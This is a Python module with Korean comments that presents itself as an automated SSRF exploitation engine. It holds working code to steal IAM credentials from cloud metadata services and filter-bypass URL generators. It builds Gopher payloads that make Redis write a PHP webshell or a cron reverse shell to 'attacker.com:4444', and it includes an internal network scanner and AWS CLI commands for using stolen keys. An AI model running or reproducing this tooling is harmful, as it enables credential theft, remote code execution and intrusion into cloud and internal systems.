"""bingo/tools/ssrf_advanced.py — SSRF 고급 익스플로잇 엔진 (v2.9.0)

기능:
  - AWS IMDSv1 / IMDSv2 자격증명 자동 탈취
  - GCP/Azure/Alibaba Cloud 메타데이터 자동 추출
  - 내부망 자동 스캔 (10.x / 172.16.x / 192.168.x)
  - Gopher 프로토콜 → Redis 명령 실행
  - SSRF 필터 우회 기법 (IP 변환, DNS rebinding, open redirect)
  - 블라인드 SSRF 탐지 (OOB 방식)
"""
from __future__ import annotations

import ipaddress
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable


@dataclass
class SsrfFinding:
    url: str
    param: str
    ssrf_target: str
    technique: str
    response_snippet: str = ""
    aws_creds: dict = field(default_factory=dict)
    internal_hosts: list[str] = field(default_factory=list)
    severity: str = "CRITICAL"


@dataclass
class SsrfReport:
    target: str
    findings: list[SsrfFinding] = field(default_factory=list)
    cloud_creds: dict = field(default_factory=dict)
    open_internal_ports: list[str] = field(default_factory=list)

    def summary(self) -> str:
        lines = [f"[SSRF ADVANCED] {self.target} | {len(self.findings)}개 발견"]
        for f in self.findings:
            cred = " [AWS CREDS!]" if f.aws_creds else ""
            lines.append(f"  [{f.technique:20}] {f.param} → {f.ssrf_target}{cred}")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 클라우드 메타데이터 타겟
# ══════════════════════════════════════════════════════════════════════════════

class CloudMetadataTargets:
    AWS = {
        "v1_token":       "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "v2_token_req":   "http://169.254.169.254/latest/api/token",
        "instance_id":    "http://169.254.169.254/latest/meta-data/instance-id",
        "hostname":       "http://169.254.169.254/latest/meta-data/hostname",
        "userdata":       "http://169.254.169.254/latest/user-data",
        "ami_id":         "http://169.254.169.254/latest/meta-data/ami-id",
        "region":         "http://169.254.169.254/latest/meta-data/placement/region",
    }
    GCP = {
        "service_account": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "project_id":      "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "ssh_keys":        "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
        "hostname":        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    }
    AZURE = {
        "token":           "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "instance":        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    }
    ALIBABA = {
        "meta":            "http://100.100.100.200/latest/meta-data/",
        "ram_creds":       "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    }


# ══════════════════════════════════════════════════════════════════════════════
# SSRF 필터 우회
# ══════════════════════════════════════════════════════════════════════════════

class SsrfBypass:
    """IP 변환 + 인코딩 우회 기법"""

    @staticmethod
    def ip_to_decimal(ip: str) -> str:
        """192.168.1.1 → 3232235777"""
        return str(int(ipaddress.ip_address(ip)))

    @staticmethod
    def ip_to_hex(ip: str) -> str:
        """192.168.1.1 → 0xC0A80101"""
        packed = ipaddress.ip_address(ip).packed
        return "0x" + packed.hex()

    @staticmethod
    def ip_to_octal(ip: str) -> str:
        """192.168.1.1 → 0300.0250.01.01"""
        parts = ip.split(".")
        return ".".join(f"0{int(p):o}" for p in parts)

    @staticmethod
    def generate_bypass_urls(original_url: str) -> list[str]:
        """단일 URL에서 다양한 우회 URL 생성"""
        m = re.match(r"(https?://)(\d+\.\d+\.\d+\.\d+)(.*)", original_url)
        if not m:
            return [original_url]
        scheme, ip, path = m.groups()
        variants = [
            original_url,
            f"{scheme}{SsrfBypass.ip_to_decimal(ip)}{path}",
            f"{scheme}{SsrfBypass.ip_to_hex(ip)}{path}",
            f"{scheme}{SsrfBypass.ip_to_octal(ip)}{path}",
            original_url.replace("http://", "http://0x7f000001@").replace("169.254.169.254", ""),
            original_url.replace("169.254.169.254", "169.254.169.254.nip.io"),
            # URL 파편화
            original_url.replace("://", "://localhost%2F%2F..%2F..%2F..%2F"),
            # IPv6 표현
            original_url.replace("169.254.169.254", "[::ffff:169.254.169.254]"),
            original_url.replace("169.254.169.254", "[0:0:0:0:0:ffff:a9fe:a9fe]"),
        ]
        return list(dict.fromkeys(variants))  # 중복 제거

    @staticmethod
    def open_redirect_chain(redirect_url: str, target: str) -> str:
        """오픈 리다이렉트를 통한 SSRF 우회"""
        return f"{redirect_url}?url={urllib.parse.quote(target)}&next={urllib.parse.quote(target)}"

    @staticmethod
    def scheme_variants(target_url: str) -> list[str]:
        """다양한 프로토콜 스킴"""
        target_no_scheme = re.sub(r"^https?://", "", target_url)
        return [
            target_url,
            f"http://{target_no_scheme}",
            f"https://{target_no_scheme}",
            f"dict://{target_no_scheme}",
            f"ftp://{target_no_scheme}",
            f"file://{target_no_scheme}",
            f"sftp://{target_no_scheme}",
            f"ldap://{target_no_scheme}",
            f"tftp://{target_no_scheme}",
        ]


# ══════════════════════════════════════════════════════════════════════════════
# Gopher → Redis 익스플로잇
# ══════════════════════════════════════════════════════════════════════════════

class GopherRedisExploit:
    """Gopher 프로토콜을 통한 Redis 명령 실행 → 웹쉘 쓰기"""

    @staticmethod
    def _encode_redis_cmd(cmd: str) -> str:
        """Redis 프로토콜 인코딩"""
        parts = cmd.split()
        encoded = f"*{len(parts)}\r\n"
        for p in parts:
            encoded += f"${len(p)}\r\n{p}\r\n"
        return encoded

    @staticmethod
    def redis_webshell_gopher(
        redis_host: str = "127.0.0.1",
        redis_port: int = 6379,
        web_path: str = "/var/www/html/shell.php",
        shell: str = "<?php system($_GET['cmd']);?>",
    ) -> str:
        """Redis CONFIG SET dir + SLAVEOF → 웹쉘 쓰기 Gopher URL"""
        web_dir = "/".join(web_path.split("/")[:-1])
        shell_file = web_path.split("/")[-1]
        cmds = [
            f"CONFIG SET dir {web_dir}",
            f"CONFIG SET dbfilename {shell_file}",
            f'SET bingo "\r\n\r\n{shell}\r\n\r\n"',
            "BGSAVE",
        ]
        raw = "\r\n".join(GopherRedisExploit._encode_redis_cmd(c) for c in cmds)
        encoded = urllib.parse.quote(raw)
        return f"gopher://{redis_host}:{redis_port}/_{encoded}"

    @staticmethod
    def redis_reverse_shell_gopher(
        redis_host: str = "127.0.0.1",
        attacker_ip: str = "attacker.com",
        attacker_port: int = 4444,
    ) -> str:
        """Redis cronshell via Gopher"""
        cron = f"\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\\n\\n"
        cmds = [
            "CONFIG SET dir /var/spool/cron/",
            "CONFIG SET dbfilename root",
            f'SET shell "{cron}"',
            "BGSAVE",
        ]
        raw = "\r\n".join(GopherRedisExploit._encode_redis_cmd(c) for c in cmds)
        encoded = urllib.parse.quote(raw)
        return f"gopher://{redis_host}:6379/_{encoded}"


# ══════════════════════════════════════════════════════════════════════════════
# 내부망 스캐너
# ══════════════════════════════════════════════════════════════════════════════

class InternalScanner:
    """SSRF를 통한 내부망 스캔"""

    INTERESTING_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 8500, 9200, 27017, 11211, 2181, 4848]

    INTERNAL_SERVICES = {
        6379:  "Redis",
        9200:  "Elasticsearch",
        8500:  "Consul",
        27017: "MongoDB",
        2181:  "Zookeeper",
        11211: "Memcached",
        5601:  "Kibana",
        15672: "RabbitMQ Management",
        8161:  "ActiveMQ Admin",
        4848:  "GlassFish Admin",
        9090:  "Prometheus",
        3000:  "Grafana / Node",
        8080:  "Tomcat",
        8888:  "Jupyter / Admin",
    }

    @staticmethod
    def generate_scan_targets(subnet: str = "192.168.1") -> list[str]:
        """서브넷 내 스캔 대상 URL 목록"""
        targets = []
        for i in range(1, 255):
            ip = f"{subnet}.{i}"
            for port in InternalScanner.INTERESTING_PORTS:
                targets.append(f"http://{ip}:{port}/")
        return targets

    @staticmethod
    def detect_open_port(status: int, body: str, elapsed: float) -> bool:
        """포트 열림 여부 판단"""
        if status in (200, 201, 301, 302, 401, 403):
            return True
        if elapsed < 0.5 and status == 400:
            return True
        return False

    @staticmethod
    def fingerprint_service(body: str) -> str:
        """응답으로 서비스 식별"""
        body_lower = body.lower()
        if "redis" in body_lower:
            return "Redis"
        if "elasticsearch" in body_lower:
            return "Elasticsearch"
        if '"cluster_name"' in body_lower:
            return "Elasticsearch"
        if "consul" in body_lower:
            return "Consul"
        if "mongodb" in body_lower:
            return "MongoDB"
        if "kibana" in body_lower:
            return "Kibana"
        return "Unknown"


# ══════════════════════════════════════════════════════════════════════════════
# AWS IMDSv2 자격증명 탈취
# ══════════════════════════════════════════════════════════════════════════════

class AwsImdsExploiter:
    """AWS EC2 메타데이터 서비스 자격증명 탈취"""

    @staticmethod
    def parse_role_from_response(body: str) -> str | None:
        """IAM Role 이름 추출"""
        lines = [line.strip() for line in body.strip().splitlines() if line.strip()]
        return lines[0] if lines else None

    @staticmethod
    def parse_credentials(body: str) -> dict:
        """자격증명 JSON 파싱"""
        import json
        try:
            data = json.loads(body)
            return {
                "AccessKeyId": data.get("AccessKeyId", ""),
                "SecretAccessKey": data.get("SecretAccessKey", ""),
                "Token": data.get("Token", ""),
                "Expiration": data.get("Expiration", ""),
            }
        except Exception:
            return {}

    @staticmethod
    def generate_aws_cli_commands(creds: dict, region: str = "ap-northeast-2") -> list[str]:
        """탈취한 크리덴셜로 AWS CLI 명령 목록"""
        ak = creds.get("AccessKeyId", "")
        sk = creds.get("SecretAccessKey", "")
        token = creds.get("Token", "")
        env = (
            f'export AWS_ACCESS_KEY_ID="{ak}"\n'
            f'export AWS_SECRET_ACCESS_KEY="{sk}"\n'
            f'export AWS_SESSION_TOKEN="{token}"\n'
            f'export AWS_DEFAULT_REGION="{region}"'
        )
        return [
            env,
            "aws sts get-caller-identity",
            "aws s3 ls",
            "aws ec2 describe-instances --region " + region,
            "aws iam list-users",
            "aws iam list-roles",
            "aws secretsmanager list-secrets",
            "aws ssm describe-parameters",
        ]


# ══════════════════════════════════════════════════════════════════════════════
# 메인 SSRF 고급 엔진
# ══════════════════════════════════════════════════════════════════════════════

class SsrfAdvancedEngine:
    """SSRF 탐지 → 클라우드 크리덴셜 탈취 → 내부망 스캔 완전 자동화"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
        oob_domain: str = "",
    ) -> None:
        self.req = request_fn
        self.oob = oob_domain

    def _test_ssrf(self, url: str, param: str, target: str, method: str = "GET") -> tuple[int, str]:
        """SSRF 파라미터에 타겟 주입"""
        bypass_urls = SsrfBypass.generate_bypass_urls(target)
        for burl in bypass_urls:
            test_url = re.sub(
                rf"({re.escape(param)}=)[^&]*",
                rf"\g<1>{urllib.parse.quote(burl)}",
                url,
            )
            status, body = self.req(test_url, method, {}, "")
            if status != 404 and body:
                return status, body
        return 0, ""

    def exploit_aws_imds(self, url: str, param: str) -> dict:
        """AWS IMDSv1 자격증명 탈취"""
        # 1단계: IAM Role 이름 획득
        status, body = self._test_ssrf(url, param, CloudMetadataTargets.AWS["v1_token"])
        role = AwsImdsExploiter.parse_role_from_response(body)
        if not role:
            return {}
        # 2단계: 실제 크리덴셜 획득
        cred_url = CloudMetadataTargets.AWS["v1_token"] + role
        _, cred_body = self._test_ssrf(url, param, cred_url)
        creds = AwsImdsExploiter.parse_credentials(cred_body)
        if creds.get("AccessKeyId"):
            creds["role"] = role
            creds["cli_commands"] = AwsImdsExploiter.generate_aws_cli_commands(creds)
        return creds

    def scan_internal(self, url: str, param: str, subnet: str = "192.168.1") -> list[str]:
        """내부망 서비스 스캔"""
        found = []
        # 대표 IP만 빠르게 테스트
        for ip_last in [1, 2, 10, 100, 200, 254]:
            ip = f"{subnet}.{ip_last}"
            for port in [80, 6379, 9200, 8080, 8500]:
                target = f"http://{ip}:{port}/"
                status, body = self._test_ssrf(url, param, target)
                if InternalScanner.detect_open_port(status, body, 0.3):
                    service = InternalScanner.fingerprint_service(body)
                    found.append(f"{ip}:{port} ({service})")
        return found

    def auto_scan(self, url: str, params: list[str]) -> SsrfReport:
        report = SsrfReport(target=url)
        for param in params:
            # AWS IMDSv1
            creds = self.exploit_aws_imds(url, param)
            if creds:
                report.cloud_creds = creds
                finding = SsrfFinding(
                    url=url, param=param,
                    ssrf_target=CloudMetadataTargets.AWS["v1_token"],
                    technique="aws_imds_v1",
                    aws_creds=creds,
                )
                report.findings.append(finding)

            # Gopher Redis
            gopher_url = GopherRedisExploit.redis_webshell_gopher()
            status, body = self._test_ssrf(url, param, gopher_url)
            if status in (200, 201):
                report.findings.append(SsrfFinding(
                    url=url, param=param,
                    ssrf_target="redis://127.0.0.1:6379",
                    technique="gopher_redis_webshell",
                ))

        return report
